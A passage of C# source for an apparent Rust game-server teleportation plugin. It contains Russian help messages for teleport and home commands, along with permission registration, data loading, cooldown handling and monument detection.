                        "Использование команды <color=yellow>/tp</color> возможно только следующим образом:",
                        "<color=yellow>/tp \"имя игрока\"</color> - Телепортирует вас к указанному игроку.",
                        "<color=yellow>/tp \"имя игрока\" \"имя игрока 2\"</color> - Телепортирует игрока с именем 'имя игрока' к игроку 'имя игрока 2'.",
                        "<color=yellow>/tp x y z</color> - Телепортирует вас к указанным координатам.",
                        "<color=yellow>/tp \"имя игрока\" x y z</color> - Телепортирует игрока с именем 'имя игрока' к указанным координатам."
                    })
                },
                {
                    "SyntaxCommandTPL", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/tpl</color> возможно только следующим образом:",
                        "<color=yellow>/tpl</color> - Отображает список сохранённых местоположений.",
                        "<color=yellow>/tpl \"название местоположения\"</color> - Телепортирует вас в место с указанным названием."
                    })
                },
                {
                    "SyntaxCommandTPSave", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/tpsave</color> возможно только следующим образом:",
                        "<color=yellow>/tpsave \"название местоположения\"</color> - Сохраняет ваше текущее местоположение с указанным названием."
                    })
                },
                {
                    "SyntaxCommandTPRemove", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/tpremove</color> возможно только следующим образом:",
                        "<color=yellow>/tpremove \"название местоположения\"</color> - Удаляет местоположение с указанным названием."
                    })
                },
                {
                    "SyntaxCommandTPN", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/tpn</color> возможно только следующим образом:",
                        "<color=yellow>/tpn \"имя игрока\"</color> - Телепортирует вас на расстояние по умолчанию позади игрока с указанным именем.",
                        "<color=yellow>/tpn \"имя игрока\" \"расстояние\"</color> - Телепортирует вас на указанное расстояние позади игрока с указанным именем."
                    })
                },
                {
                    "SyntaxCommandSetHome", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/home add</color> возможно только следующим образом:",
                        "<color=yellow>/home add \"название\"</color> - Сохраняет ваше текущее местоположение как ваш дом с указанным названием."
                    })
                },
                {
                    "SyntaxCommandRemoveHome", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/home remove</color> возможно только следующим образом:",
                        "<color=yellow>/home remove \"название\"</color> - Удаляет местоположение дома с указанным названием."
                    })
                },
                {
                    "SyntaxCommandHome", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/home</color> возможно только следующим образом:",
                        "<color=yellow>/home \"название\"</color> - Телепортирует вас в ваш дом с указанным названием.",
                        "<color=yellow>/home \"название\" pay</color> - Телепортирует вас в ваш дом с указанным названием, избегая перезарядки, заплатив за это.",
                        "<color=yellow>/home add \"название\"</color> - Сохраняет ваше текущее местоположение как ваш дом с указанным названием.",
                        "<color=yellow>/home list</color> - Отображает список всех местоположений, сохранённых вами как дом.",
                        "<color=yellow>/home remove \"название\"</color> - Удаляет местоположение дома с указанным названием."
                    })
                },
                {
                    "SyntaxCommandHomeAdmin", string.Join(NewLine, new[]
                    {
                        "<color=yellow>/home radius \"радиус\"</color> - Отображает список всех домов в радиусе(10).",
                        "<color=yellow>/home delete \"имя игрока или ID\" \"название\"</color> - Удаляет дом с указанным названием, принадлежащий указанному игроку.",
                        "<color=yellow>/home tp \"имя игрока или ID\" \"название\"</color> - Телепортирует вас в дом с указанным названием, принадлежащий указанному игроку.",
                        "<color=yellow>/home homes \"имя игрока или ID\"</color> - Отображает вам список всех домов, принадлежащих указанному игроку."
                    })
                },
                {
                    "SyntaxCommandTown", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/town</color> возможно только следующим образом:",
                        "<color=yellow>/town</color> - Телепортирует вас в Город.",
                        "<color=yellow>/town pay</color> - Телепортирует вас в Город с оплатой штрафа."
                    })
                },
                {
                    "SyntaxCommandTownAdmin", string.Join(NewLine, new[]
                    {
                        "<color=yellow>/town set</color> - Сохраняет текущее местоположение как Город.",
                    })
                },
                {
                    "SyntaxCommandOutpost", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/outpost</color> возможно только следующим образом:",
                        "<color=yellow>/outpost</color> - Телепортирует вас в Город NPC.",
                        "<color=yellow>/outpost pay</color> - Телепортирует вас в Город NPC с оплатой штрафа."
                    })
                },
                {
                    "SyntaxCommandOutpostAdmin", string.Join(NewLine, new[]
                    {
                        "<color=yellow>/outpost set</color> - Сохраняет текущее местоположение как Город NPC.",
                    })
                },
                {
                    "SyntaxCommandBandit", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/bandit</color> возможно только следующим образом:",
                        "<color=yellow>/bandit</color> - Телепортирует вас в Лагерь бандитов.",
                        "<color=yellow>/bandit pay</color> - Телепортирует вас в Лагерь бандитов с оплатой штрафа."
                    })
                },
                {
                    "SyntaxCommandBanditAdmin", string.Join(NewLine, new[]
                    {
                        "<color=yellow>/bandit set</color> - Сохраняет текущее местоположение как Лагерь бандитов.",
                    })
                },
                {
                    "SyntaxCommandHomeDelete", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/home delete</color> возможно только следующим образом:",
                        "<color=yellow>/home delete \"имя игрока или ID\" \"название\"</color> - Удаляет дом с указанным названием, принадлежащий указанному игроку."
                    })
                },
                {
                    "SyntaxCommandHomeAdminTP", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/home tp</color> возможно только следующим образом:",
                        "<color=yellow>/home tp \"имя игрока или ID\" \"название\"</color> - Телепортирует вас в дом игрока с указанным названием, принадлежащий указанному игроку."
                    })
                },
                {
                    "SyntaxCommandHomeHomes", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/home homes</color> возможно только следующим образом:",
                        "<color=yellow>/home homes \"имя игрока или ID\"</color> - Отображает вам список всех домов, принадлежащих указанному игроку."
                    })
                },
                {
                    "SyntaxCommandListHomes", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/home list</color> возможно только следующим образом:",
                        "<color=yellow>/home list</color> - Отображает список всех местоположений, сохранённых вами как дом."
                    })
                },
                {
                    "SyntaxCommandTPR", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/tpr</color> возможно только следующим образом:",
                        "<color=yellow>/tpr \"имя игрока или ID\"</color> - Отправляет указанному игроку запрос на телепортацию."
                    })
                },
                {
                    "SyntaxCommandTPA", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/tpa</color> возможно только следующим образом:",
                        "<color=yellow>/tpa</color> - Принять входящий запрос на телепортацию."
                    })
                },
                {
                    "SyntaxCommandTPC", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование команды <color=yellow>/tpc</color> возможно только следующим образом:",
                        "<color=yellow>/tpc</color> - Отменить запрос на телепортацию."
                    })
                },
                {
                    "SyntaxConsoleCommandToPos", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование консольной команды <color=orange>teleport.topos</color> возможно только следующим образом:",
                        " > <color=orange>teleport.topos \"имя игрока\" x y z</color>"
                    })
                },
                {
                    "SyntaxConsoleCommandToPlayer", string.Join(NewLine, new[]
                    {
                        "Произошла синтаксическая ошибка!",
                        "Использование консольной команды <color=orange>teleport.toplayer</color> возможно только следующим образом:",
                        " > <color=orange>teleport.toplayer \"имя игрока или ID\" \"имя игрока 2|id 2\"</color>"
                    })
                },
                {"LogTeleport", "{0} телепортирован к {1}."},
                {"LogTeleportPlayer", "{0} телепортировал {1} к {2}."},
                {"LogTeleportBack", "{0} телепортирован назад, в предыдущее местоположение."}
            };

            foreach (var key in config.DynamicCommands.Keys)
            {
                ru[key] = key;
            }

            lang.RegisterMessages(ru, this, "ru");
        }

        private void Init()
        {
            Unsubscribe(nameof(OnPlayerViolation));
            Unsubscribe(nameof(OnEntityTakeDamage));
            Unsubscribe(nameof(OnPlayerSleepEnded));
            Unsubscribe(nameof(OnPlayerDisconnected));
        }

        private string OnPlayerConnected(BasePlayer player)
        {
            var uid = UnityEngine.Random.Range(1000, 9999).ToString();
            var names = BasePlayer.activePlayerList.Select(x => x.displayName);

            while (_ids.ContainsKey(uid) || names.Any(name => name.Contains(uid)))
            {
                uid = UnityEngine.Random.Range(1000, 9999).ToString();
            }

            _ids[uid] = player;
            _players[player] = uid;

            return uid;
        }

        private Dictionary<string, StoredData> _DynamicData = new Dictionary<string, StoredData>();

        public class StoredData
        {
            public Dictionary<ulong, TeleportData> TPData = new Dictionary<ulong, TeleportData>();
            public bool Changed = true;
        }

        private void LoadDataAndPerms()
        {
            dataAdmin = GetFile("Admin");
            try { _Admin = dataAdmin.ReadObject<Dictionary<ulong, AdminData>>(); } catch { }
            if (_Admin == null) { _Admin = new Dictionary<ulong, AdminData>(); changedAdmin = true; }

            dataHome = GetFile("Home");
            try { _Home = dataHome.ReadObject<Dictionary<ulong, HomeData>>(); } catch { }
            if (_Home == null) { _Home = new Dictionary<ulong, HomeData>(); changedHome = true; }

            dataTPT = GetFile("TPT");
            try { TPTToggle = dataTPT.ReadObject<List<string>>(); } catch { }
            if (TPTToggle == null) { TPTToggle = new List<string>(); changedTPT = true; }

            foreach (var entry in config.DynamicCommands)
            {
                if (!entry.Value.Enabled) continue;

                var dcf = GetFile(entry.Key);
                Dictionary<ulong, TeleportData> data = null;

                try
                {
                    data = dcf.ReadObject<Dictionary<ulong, TeleportData>>();
                }
                catch
                {

                }

                if (data == null)
                {
                    data = new Dictionary<ulong, TeleportData>();
                }

                GetSettings(entry.Key).Teleports = _DynamicData[entry.Key] = new StoredData
                {
                    TPData = data,
                    Changed = true
                };
            }

            dataTPR = GetFile("TPR");
            try { _TPR = dataTPR.ReadObject<Dictionary<ulong, TeleportData>>(); } catch { }
            if (_TPR == null) { _TPR = new Dictionary<ulong, TeleportData>(); changedTPR = true; }

            dataDisabled = GetFile("DisabledCommands");
            try { DisabledCommandData = dataDisabled.ReadObject<DisabledData>(); } catch { }
            if (DisabledCommandData == null) { DisabledCommandData = new DisabledData(); }

            permission.RegisterPermission("nteleportation.globalcooldownvip", this);
            permission.RegisterPermission(PermFoundationCheck, this);
            permission.RegisterPermission(PermDeleteHome, this);
            permission.RegisterPermission(PermHome, this);
            permission.RegisterPermission(PermHomeHomes, this);
            permission.RegisterPermission(PermImportHomes, this);
            permission.RegisterPermission(PermRadiusHome, this);
            permission.RegisterPermission(PermTp, this);
            permission.RegisterPermission(PermTpB, this);
            permission.RegisterPermission(PermTpR, this);
            permission.RegisterPermission(PermTpConsole, this);
            permission.RegisterPermission(PermTpHome, this);
            permission.RegisterPermission(PermTpT, this);
            permission.RegisterPermission(PermTpN, this);
            permission.RegisterPermission(PermTpL, this);
            permission.RegisterPermission(PermTpRemove, this);
            permission.RegisterPermission(PermTpSave, this);
            permission.RegisterPermission(PermWipeHomes, this);
            permission.RegisterPermission(PermCraftHome, this);
            permission.RegisterPermission(PermCraftTpR, this);
            permission.RegisterPermission(PermExempt, this);
            permission.RegisterPermission(PermTpMarker, this);

            CheckPerms(config.Home.VIPCooldowns);
            CheckPerms(config.Home.VIPCountdowns);
            CheckPerms(config.Home.VIPDailyLimits);
            CheckPerms(config.Home.VIPHomesLimits);
            CheckPerms(config.TPR.VIPCooldowns);
            CheckPerms(config.TPR.VIPCountdowns);
            CheckPerms(config.TPR.VIPDailyLimits);

            foreach (var entry in config.DynamicCommands)
            {
                RegisterCommand(entry.Key, entry.Value, false);
            }
        }

        private void RegisterCommand(string command, string callback, string perm = null)
        {
            if (!string.IsNullOrEmpty(command) && !command.Equals("null", StringComparison.OrdinalIgnoreCase))
            {
                AddCovalenceCommand(command, callback, perm);
            }
        }

        private void UnregisterCommand(string command)
        {
            covalence.UnregisterCommand(command, this);
        }

        private void RegisterCommand(string key, TownSettings settings, bool justCreated)
        {
            CheckPerms(settings.VIPCooldowns);
            CheckPerms(settings.VIPCountdowns);
            CheckPerms(settings.VIPDailyLimits);

            string tpPerm = $"{Name}.tp{key}".ToLower();
            string craftPerm = $"{Name}.craft{key}".ToLower();

            if (!permission.PermissionExists(tpPerm, this))
            {
                permission.RegisterPermission(tpPerm, this);
            }

            if (!permission.PermissionExists(craftPerm))
            {
                permission.RegisterPermission(craftPerm, this);
            }

            if (justCreated)
            {
                settings.Teleports = _DynamicData[key] = new StoredData();
            }
        }

        private DynamicConfigFile GetFile(string name)
        {
            var fileName = string.IsNullOrEmpty(config.Settings.DataFileFolder) ? $"{Name}{name}" : $"{config.Settings.DataFileFolder}{Path.DirectorySeparatorChar}{name}";
            var file = Interface.Oxide.DataFileSystem.GetFile(fileName);
            file.Settings.ReferenceLoopHandling = ReferenceLoopHandling.Ignore;
            file.Settings.Converters = new JsonConverter[] { new UnityVector3Converter(), new CustomComparerDictionaryCreationConverter<string>(StringComparer.OrdinalIgnoreCase) };
            return file;
        }

        private void SetGlobalCooldown(BasePlayer player)
        {
            if (config.Settings.GlobalVIP > 0f && permission.UserHasPermission(player.UserIDString, "nteleportation.globalcooldownvip"))
            {
                ulong userid = player.userID;
                TeleportCooldowns[userid] = Time.time + config.Settings.GlobalVIP;
                timer.Once(config.Settings.GlobalVIP, () => TeleportCooldowns.Remove(userid));
            }
            else if (config.Settings.Global > 0f)
            {
                ulong userid = player.userID;
                TeleportCooldowns[userid] = Time.time + config.Settings.Global;
                timer.Once(config.Settings.Global, () => TeleportCooldowns.Remove(userid));
            }
        }

        private float GetGlobalCooldown(BasePlayer player)
        {
            float cooldown;
            if (!TeleportCooldowns.TryGetValue(player.userID, out cooldown))
            {
                return 0f;
            }

            return cooldown - Time.time;
        }

        private void CheckNewSave()
        {
            if (BuildingManager.server.buildingDictionary.Count == 0)
            {
                newSave = true;
            }

            if (!newSave)
            {
                return;
            }

            if (config.Settings.WipeOnUpgradeOrChange)
            {
                bool changed = false;

                if (_Home.Count > 0)
                {
                    changed = true;
                    _Home.Clear();
                    changedHome = true;
                }

                if (_TPR.Count > 0)
                {
                    changed = true;
                    _TPR.Clear();
                    changedTPR = true;
                }

                foreach (var entry in config.DynamicCommands.ToList())
                {
                    if (entry.Value.Location != Vector3.zero || entry.Value.Locations.Count > 0)
                    {
                        changed = true;
                        entry.Value.Location = Vector3.zero;
                        entry.Value.Locations.Clear();
                    }
                }

                if (!changed) return;
                Puts("Rust was upgraded or map changed - clearing homes and all locations!");                
                SaveConfig();
            }
            else
            {
                Puts("Rust was upgraded or map changed - homes, town, islands, outpost and bandit may be invalid!");
            }
        }

        void OnServerInitialized()
        {
            if (config.Settings.Interrupt.Hurt || config.Settings.Interrupt.Cold || config.Settings.Interrupt.Hot)
            {
                Subscribe(nameof(OnEntityTakeDamage));
            }

            Subscribe(nameof(OnPlayerSleepEnded));
            Subscribe(nameof(OnPlayerDisconnected));

            boundary = TerrainMeta.Size.x / 2;

            foreach (var item in config.Settings.BlockedItems)
            {
                var definition = ItemManager.FindItemDefinition(item.Key);
                if (definition == null)
                {
                    Puts("Blocked item not found: {0}", item.Key);
                    continue;
                }
                ReverseBlockedItems[definition.itemid] = item.Value;
            }

            InitializeDynamicCommands();
            LoadDataAndPerms();
            CheckNewSave();

            if (config.Settings.TPREnabled) AddCovalenceCommand("tpr", nameof(CommandTeleportRequest));
            if (config.Settings.HomesEnabled)
            {
                AddCovalenceCommand("home", nameof(CommandHome));
                AddCovalenceCommand("sethome", nameof(CommandSetHome));
                AddCovalenceCommand("listhomes", nameof(CommandListHomes));
                AddCovalenceCommand("removehome", nameof(CommandRemoveHome));
                AddCovalenceCommand("radiushome", nameof(CommandHomeRadius));
                AddCovalenceCommand("deletehome", nameof(CommandHomeDelete));
                AddCovalenceCommand("tphome", nameof(CommandHomeAdminTP));
                AddCovalenceCommand("homehomes", nameof(CommandHomeHomes));
            }

            AddCovalenceCommand("tnt", nameof(CommandToggle));
            AddCovalenceCommand("tp", nameof(CommandTeleport));
            AddCovalenceCommand("tpn", nameof(CommandTeleportNear));
            AddCovalenceCommand("tpl", nameof(CommandTeleportLocation));
            AddCovalenceCommand("tpsave", nameof(CommandSaveTeleportLocation));
            AddCovalenceCommand("tpremove", nameof(CommandRemoveTeleportLocation));
            AddCovalenceCommand("tpb", nameof(CommandTeleportBack));
            AddCovalenceCommand("tpa", nameof(CommandTeleportAccept));
            AddCovalenceCommand("tpat", nameof(CommandTeleportAcceptToggle));
            AddCovalenceCommand("wipehomes", nameof(CommandWipeHomes));
            AddCovalenceCommand("tphelp", nameof(CommandTeleportHelp));
            AddCovalenceCommand("tpinfo", nameof(CommandTeleportInfo));
            AddCovalenceCommand("tpc", nameof(CommandTeleportCancel));
            AddCovalenceCommand("teleport.toplayer", nameof(CommandTeleportII));
            AddCovalenceCommand("teleport.topos", nameof(CommandTeleportII));
            AddCovalenceCommand("teleport.importhomes", nameof(CommandImportHomes));
            AddCovalenceCommand("spm", nameof(CommandSphereMonuments));
            FindMonuments();
            foreach (var player in BasePlayer.activePlayerList) OnPlayerConnected(player);
        }

        void OnNewSave(string strFilename)
        {
            newSave = true;
        }

        void OnServerSave()
        {
            SaveTeleportsAdmin();
            SaveTeleportsHome();
            SaveTeleportsTPR();
            SaveTeleportsTPT();
            SaveTeleportsTown();
        }

        void OnServerShutdown() => OnServerSave();

        void Unload() => OnServerSave();

        void OnEntityTakeDamage(BasePlayer player, HitInfo hitInfo)
        {
            if (player == null || player.IsNpc || !player.userID.IsSteamId() || hitInfo == null) return;
            if (hitInfo.damageTypes.Has(DamageType.Fall) && teleporting.ContainsKey(player.userID))
            {
                hitInfo.damageTypes = new DamageTypeList();
                teleporting.Remove(player.userID);
                if (teleporting.Count == 0) Unsubscribe(nameof(OnPlayerViolation));
                return;
            }
            if (permission.UserHasPermission(player.userID.ToString(), PermExempt)) return;
            TeleportTimer teleportTimer;
            if (!TeleportTimers.TryGetValue(player.userID, out teleportTimer)) return;
            DamageType major = hitInfo.damageTypes.GetMajorityDamageType();

            NextTick(() =>
            {
                if (!player || !hitInfo.hasDamage) return;
                // 1.0.84 new checks for cold/heat based on major damage for the player
                if (major == DamageType.Cold)
                {
                    if (config.Settings.Interrupt.Cold && player.metabolism.temperature.value <= config.Settings.MinimumTemp)
                    {
                        PrintMsgL(teleportTimer.OriginPlayer, "TPTooCold");
                        if (teleportTimer.TargetPlayer != null)
                        {
                            PrintMsgL(teleportTimer.TargetPlayer, "InterruptedTarget", teleportTimer.OriginPlayer?.displayName);
                        }
                        teleportTimer.Timer.Destroy();
                        TeleportTimers.Remove(player.userID);
                    }
                }
                else if (major == DamageType.Heat)
                {
                    if (config.Settings.Interrupt.Hot && player.metabolism.temperature.value >= config.Settings.MaximumTemp)
                    {
                        PrintMsgL(teleportTimer.OriginPlayer, "TPTooHot");
                        if (teleportTimer.TargetPlayer != null)
                        {
                            PrintMsgL(teleportTimer.TargetPlayer, "InterruptedTarget", teleportTimer.OriginPlayer?.displayName);
                        }
                        teleportTimer.Timer.Destroy();
                        TeleportTimers.Remove(player.userID);
                    }
                }
                else if (config.Settings.Interrupt.Hurt)
                {
                    PrintMsgL(teleportTimer.OriginPlayer, "Interrupted");
                    if (teleportTimer.TargetPlayer != null)
                    {
                        PrintMsgL(teleportTimer.TargetPlayer, "InterruptedTarget", teleportTimer.OriginPlayer?.displayName);
                    }
                    teleportTimer.Timer.Destroy();
                    TeleportTimers.Remove(player.userID);
                }
            });
        }

        object OnPlayerViolation(BasePlayer player, AntiHackType type, float amount)
        {
            if (type == AntiHackType.InsideTerrain && teleporting.ContainsKey(player.userID))
            {
                return false;
            }

            return null;
        }

        void OnPlayerSleepEnded(BasePlayer player)
        {
            if (!player || !teleporting.ContainsKey(player.userID)) return;
            ulong userID = player.userID;
            timer.Once(3f, () =>
            {
                teleporting.Remove(userID);

                if (teleporting.Count == 0) Unsubscribe(nameof(OnPlayerViolation));
            });
            SendEffect(player);
        }

        void OnPlayerDisconnected(BasePlayer player)
        {
            if (!player) return;
            Timer reqTimer;
            if (PendingRequests.TryGetValue(player.userID, out reqTimer))
            {
                var originPlayer = PlayersRequests[player.userID];
                if (originPlayer)
                {
                    PlayersRequests.Remove(originPlayer.userID);
                    PrintMsgL(originPlayer, "RequestTargetOff");
                }
                reqTimer.Destroy();
                PendingRequests.Remove(player.userID);
                PlayersRequests.Remove(player.userID);
            }
            TeleportTimer teleportTimer;
            if (TeleportTimers.TryGetValue(player.userID, out teleportTimer))
            {
                teleportTimer.Timer.Destroy();
                TeleportTimers.Remove(player.userID);
            }
            teleporting.Remove(player.userID);
        }

        private void SaveTeleportsAdmin()
        {
            if (_Admin == null || !changedAdmin) return;
            dataAdmin.WriteObject(_Admin);
            changedAdmin = false;
        }

        private void SaveTeleportsHome()
        {
            if (_Home == null || !changedHome) return;
            dataHome.WriteObject(_Home);
            changedHome = false;
        }

        private void SaveTeleportsTPR()
        {
            if (_TPR == null || !changedTPR) return;
            dataTPR.WriteObject(_TPR);
            changedTPR = false;
        }

        private void SaveTeleportsTPT()
        {
            if (TPTToggle == null || !changedTPT) return;
            dataTPT.WriteObject(TPTToggle);
            changedTPT = false;
        }

        private void SaveTeleportsTown()
        {
            foreach (var entry in _DynamicData.ToList())
            {
                if (entry.Value.Changed)
                {
                    var fileName = string.IsNullOrEmpty(config.Settings.DataFileFolder) ? $"{Name}{entry.Key}" : $"{config.Settings.DataFileFolder}{Path.DirectorySeparatorChar}{entry.Key}";
                    Interface.Oxide.DataFileSystem.WriteObject(fileName, entry.Value.TPData);
                    entry.Value.Changed = false;
                }
            }
        }

        private void SaveLocation(BasePlayer player, Vector3 position)
        {
            if (player == null || !IsAllowed(player, PermTpB)) return;
            AdminData adminData;
            if (!_Admin.TryGetValue(player.userID, out adminData))
                _Admin[player.userID] = adminData = new AdminData();
            adminData.PreviousLocation = position;
            changedAdmin = true;
            PrintMsgL(player, "AdminTPBackSave");
        }

        private void RemoveLocation(BasePlayer player)
        {
            AdminData adminData;
            if (!_Admin.TryGetValue(player.userID, out adminData))
                return;
            adminData.PreviousLocation = Vector3.zero;
            changedAdmin = true;
        }

        char[] chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
        private readonly System.Text.StringBuilder _sb = new System.Text.StringBuilder();

        string RandomString(int minAmount = 4, int maxAmount = 10)
        {
            _sb.Length = 0;

            for (int i = 0; i < UnityEngine.Random.Range(minAmount, maxAmount + 1); i++)
                _sb.Append(chars.GetRandom());

            return _sb.ToString();
        }

        void FindMonuments()
        {
            var bandit = GetSettings("bandit");
            var outpost = GetSettings("outpost");
            var realWidth = 0f;
            string name = null;
            foreach (var monument in UnityEngine.Object.FindObjectsOfType<MonumentInfo>())
            {
                var monPos = monument.transform.position;
                name = monument.displayPhrase.english.TrimEnd();

                if (string.IsNullOrEmpty(name))
                {
                    if (monument.name.Contains("cave"))
                    {
                        name = (monument.name.Contains("cave_small") ? "Small Cave" : monument.name.Contains("cave_medium") ? "Medium Cave" : "Large Cave") + ":" + RandomString();
                    }
                    else name = monument.name;
                }
                realWidth = monument.name == "OilrigAI" ? 100f : monument.name == "OilrigAI2" ? 200f : 0f;
#if DEBUG
                Puts($"Found {name}, extents {monument.Bounds.extents}");
#endif
                if (realWidth > 0f)
                {
#if DEBUG
                    Puts($"  corrected to {realWidth}");
#endif
                }
                if (monument.name.Contains("cave"))
                {
#if DEBUG
                    Puts("  Adding to cave list");
#endif
                    if (caves.ContainsKey(name)) name += RandomString();
                    caves.Add(name, monPos);
                }
                else if (monument.name == outpostPrefab)
                {
                    if (outpost == null)
                    {
                        outpostEnabled = false;
                        continue;
                    }

                    float radius = monument.Bounds.size.Max();

                    if (outpost.Location != Vector3.zero && outpost.Locations.Exists(a => OutOfRange(monument, a)))
                    {
#if DEBUG
                        Puts("Invalid Outpost location detected");
#endif
                        outpost.Location = Vector3.zero;
                        outpost.Locations = new List<Vector3>();
                    }
                    if (config.Settings.AutoGenOutpost && outpost.Location == Vector3.zero)
                    {
#if DEBUG
                        Puts("  Adding Outpost target");
#endif
                        bool changedOutpost = false;
                        var ents = Pool.GetList<BaseEntity>();
                        Vis.Entities(monPos, radius, ents);
                        foreach (BaseEntity entity in ents)
                        {
                            if (OutOfRange(monument, entity.transform.position))
                            {
                                continue;
                            }
                            if (entity.prefabID == 3858860623)
                            {
                                outpost.Location = entity.transform.position + entity.transform.forward + new Vector3(0f, 1f, 0f);
                                if (!outpost.Locations.Contains(outpost.Location)) outpost.Locations.Add(outpost.Location);
                                changedOutpost = true;
                            }
                            else if (entity is Workbench)
                            {
                                outpost.Location = entity.transform.position + entity.transform.forward + new Vector3(0f, 1f, 0f);
                                if (!outpost.Locations.Contains(outpost.Location)) outpost.Locations.Add(outpost.Location);
                                changedOutpost = true;
                            }
                            else if (entity is BaseChair)
                            {
                                outpost.Location = entity.transform.position + entity.transform.right + new Vector3(0f, 1f, 0f);
                                if (!outpost.Locations.Contains(outpost.Location)) outpost.Locations.Add(outpost.Location);
                                changedOutpost = true;
                            }
                        }
                        if (changedOutpost) SaveConfig();
                        Pool.FreeList(ref ents);
                    }

                    if (outpost.Location == Vector3.zero)
                    {
                        outpostEnabled = false;
                    }
                }
                else if (monument.name == banditPrefab)
                {
                    if (bandit == null)
                    {
                        banditEnabled = false;
                        continue;
                    }

                    float radius = monument.Bounds.size.Max();

                    if (bandit.Location != Vector3.zero && bandit.Locations.Exists(a => OutOfRange(monument, a)))
                    {
#if DEBUG
                        Puts("Invalid Bandit location detected");
#endif
                        bandit.Location = Vector3.zero;
                        bandit.Locations = new List<Vector3>();
                    }
                    if (config.Settings.AutoGenBandit && bandit.Location == Vector3.zero)
                    {
#if DEBUG
                        Puts("  Adding BanditTown target");
#endif
                        bool changedBandit = false;
                        var ents = Pool.GetList<BaseEntity>();
                        Vis.Entities(monPos, radius, ents);
                        foreach (BaseEntity entity in ents)
                        {
                            if (OutOfRange(monument, entity.transform.position))
                            {
                                continue;
                            }
                            if (entity.prefabID == 3858860623)
                            {
                                bandit.Location = entity.transform.position + entity.transform.forward + new Vector3(0f, 1f, 0f);
                                if (!bandit.Locations.Contains(bandit.Location)) bandit.Locations.Add(bandit.Location);
                                changedBandit = true;
                            }
                            else if (entity is Workbench)
                            {
                                bandit.Location = entity.transform.position + entity.transform.forward + new Vector3(0f, 1f, 0f);
                                if (!bandit.Locations.Contains(bandit.Location)) bandit.Locations.Add(bandit.Location);
                                changedBandit = true;
                            }
                            else if (entity is BaseChair)
                            {
                                bandit.Location = entity.transform.position + entity.transform.forward + new Vector3(0f, 1f, 0f);
                                if (!bandit.Locations.Contains(bandit.Location)) bandit.Locations.Add(bandit.Location);
                                changedBandit = true;
                            }
                        }
                        Pool.FreeList(ref ents);
                        if (changedBandit) SaveConfig();
                    }

                    if (bandit.Location == Vector3.zero)
                    {
                        banditEnabled = false;
                    }
                }
                else
                {
                    if (monuments.ContainsKey(name)) name += ":" + RandomString(5, 5);
                    if (monument.name.Contains("power_sub")) name = monument.name.Substring(monument.name.LastIndexOf("/") + 1).Replace(".prefab", "") + ":" + RandomString(5, 5);
                    float radius = GetMonumentFloat(name);
                    monuments[name] = new MonInfo() { Position = monPos, Radius = radius };
#if DEBUG
                    Puts($"Adding Monument: {name}, pos: {monPos}, size: {radius}");
#endif
                }
            }

            if (bandit != null && bandit.Location != Vector3.zero && !bandit.Locations.Contains(bandit.Location))
            {
                bandit.Locations.Add(bandit.Location);
            }

            if (outpost != null && outpost.Location != Vector3.zero && !outpost.Locations.Contains(outpost.Location))
            {
                outpost.Locations.Add(outpost.Location);
            }
        }

        private bool OutOfRange(MonumentInfo m, Vector3 a) => m.transform.position.y - a.y > 3f || !m.IsInBounds(a);

        private void CommandToggle(IPlayer user, string command, string[] args)
        {
            if (!user.IsAdmin) return;

            if (args.Length == 0)
            {
                user.Reply("tnt commandname");
                return;
            }

            string arg = args[0].ToLower();

            if (arg == command.ToLower()) return;

            if (!DisabledCommandData.DisabledCommands.Contains(arg))
                DisabledCommandData.DisabledCommands.Add(arg);
            else DisabledCommandData.DisabledCommands.Remove(arg);

            dataDisabled.WriteObject(DisabledCommandData);
            user.Reply("{0} {1}", null, DisabledCommandData.DisabledCommands.Contains(arg) ? "Disabled:" : "Enabled:", arg);
        }

        private void CommandTeleport(IPlayer user, string command, string[] args)
        {
            if (DisabledCommandData.DisabledCommands.Contains(command.ToLower())) { user.Reply("Disabled command: " + command); return; }
            var player = user.Object as BasePlayer;
            if (!player || !IsAllowedMsg(player, PermTp) || !player.IsConnected || (player.IsSleeping() && !player.IsAdmin)) return;
            BasePlayer target;
            float x, y, z;
            switch (args.Length)
            {
                case 1:
                    target = FindPlayersSingle(args[0], player);
                    if (target == null) return;
                    if (target == player)
                    {
#if DEBUG
                        Puts("Debug mode - allowing self teleport.");
#else
                    PrintMsgL(player, "CantTeleportToSelf");
                    return;
#endif
                    }
                    Teleport(player, target);
                    PrintMsgL(player, "AdminTP", target.displayName);
                    Puts(_("LogTeleport", null, player.displayName, target.displayName));
                    if (config.Admin.AnnounceTeleportToTarget)
                        PrintMsgL(target, "AdminTPTarget", player.displayName);
                    break;
                case 2:
                    var origin = FindPlayersSingle(args[0], player);
                    if (origin == null) return;
                    target = FindPlayersSingle(args[1], player);
                    if (target == null) return;
                    if (target == origin)
                    {
